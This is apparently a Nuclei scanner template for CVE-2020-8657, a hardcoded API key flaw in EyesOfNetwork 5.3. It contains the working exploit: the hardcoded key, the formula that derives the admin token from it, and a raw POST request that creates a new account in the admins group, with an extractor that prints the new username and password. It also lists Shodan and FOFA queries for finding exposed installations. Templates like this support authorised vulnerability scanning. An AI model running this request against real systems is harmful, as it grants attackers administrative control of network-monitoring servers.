http:
- extractors:
  - dsl:
    - '"Username: " + username + ". Password: "+ password'
    type: dsl
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"api_version"'
    - 200 OK
    - A new user have been successfully inserted
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /eonapi/createEonUser?username=admin&apiKey={{ sha256(md5(key + userid)
    + Host) }} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"user_name":"{{username}}","user_group":"admins","user_password":"{{password}}"}

    '
  stop-at-first-match: true
id: CVE-2020-8657
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:eyesofnetwork:eyesofnetwork:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-8657
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-798
    epss-percentile: 0.99372
    epss-score: 0.86393
  description: 'An issue was discovered in EyesOfNetwork 5.3. The installation uses
    the same API key (hardcoded as EONAPI_KEY in include/api_functions.php for API
    version 2.4.2) by default for all installations, hence allowing an attacker to
    calculate/guess the admin access token.

    '
  impact: 'Successful exploitation allows an attacker to create administrative users
    and gain unauthorized access to the EyesOfNetwork management system.

    '
  metadata:
    fofa-query: title="EyesOfNetwork"
    max-request: 1
    product: eyesofnetwork
    shodan-query: html:"EyesOfNetwork"
    vendor: eyesofnetwork
    verified: true
  name: EyesOfNetwork - Hardcoded API Key
  reference:
  - https://www.exploit-db.com/exploits/48025
  - https://nvd.nist.gov/vuln/detail/CVE-2020-8657
  remediation: 'Upgrade to a newer version of EyesOfNetwork or change the default
    hardcoded API key in the configuration.

    '
  severity: critical
  tags: cve,cve2020,eyesofnetwork,hardcoded-key,kev,vkev,vuln
variables:
  key: "\u20ACOn@piK3Y"
  password: '{{randstr}}'
  userid: '1'
  username: '{{randstr}}'
